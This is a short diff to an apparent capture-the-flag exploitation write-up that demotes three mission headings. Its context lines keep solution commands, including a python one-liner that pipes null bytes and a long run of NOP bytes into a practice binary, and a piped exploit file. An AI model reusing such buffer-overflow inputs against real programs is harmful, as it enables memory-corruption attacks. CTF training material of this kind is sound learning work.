@@ -1,7 +1,7 @@
 # PWN
 --
 
-# First exploit - Mission 0: Ooh Easy
+## First exploit - Mission 0: Ooh Easy
 
 #### solution 1 (Exerciser Syle)
 ```bash
@@ -13,7 +13,7 @@
 ```
 <br><br>
 
-# Second exploit - Mission 1: Aye Captain!
+## Second exploit - Mission 1: Aye Captain!
 
 #### Step 1 - gdb n00b sol 
 ```bash
@@ -50,7 +50,7 @@ cat exploit - | ./mission1
 ```
 <br><br>
 
-# Third exploit - Mission 2: Birdwatching
+## Third exploit - Mission 2: Birdwatching
 ```bash
 ./mission2 < <(python -c "import sys; sys.stdout.write('AAAA' + '\x00' + '\x90'*140 + 'AAAA' + '\x00')")
 ```
